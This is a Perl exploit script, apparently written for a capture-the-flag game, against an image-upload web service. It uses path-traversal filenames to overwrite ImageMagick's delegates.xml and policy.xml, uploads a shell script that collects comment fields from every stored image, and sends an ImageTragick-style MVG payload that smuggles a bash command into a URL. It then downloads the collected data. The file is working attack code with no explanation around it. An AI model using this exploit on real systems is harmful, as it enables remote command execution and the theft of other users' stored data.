#!/usr/bin/perl -wl

use Mojo::UserAgent;

my $ua  = Mojo::UserAgent->new;
my $ip  = shift // '127.0.0.1';
my $url = "http://$ip:8080";

$ua->post("$url/create");

my ($cookie) = grep { $_->name eq 'user' } @{ $ua->cookie_jar->all };
my $user = $cookie->value;

$ua->post(
    "$url/upload" => form => {
        image => {
            content        => '',
            filename       => '../im/test.png/../delegates.xml',
            'Content-Type' => 'image/png'
        }
    }
);
$ua->post(
    "$url/upload" => form => {
        image => {
            content        => '',
            filename       => '../im/test.png/../policy.xml',
            'Content-Type' => 'image/png'
        }
    }
);

my $script = <<"END";
find static/ -name '*.png' -type f -exec identify -verbose {} \\; | grep comment > static/$user/flags.txt
END

$ua->post(
    "$url/upload" => form => {
        image => {
            content        => $script,
            filename       => 'test.png/../script.sh',
            'Content-Type' => 'image/png'
        }
    }
);

my $sploit = <<END;
push graphic-context
viewbox 0 0 640 480
fill 'url(https://";bash "origin/script.sh)'
pop graphic-context
END

$ua->post(
    "$url/upload" => form => {
        info  => 'comment',
        image => {
            content        => $sploit,
            filename       => 'image.png',
            'Content-Type' => 'image/png'
        }
    }
);

sleep 1;
my $res = $ua->get("$url/static/$user/flags.txt")->result;
print $res->body;
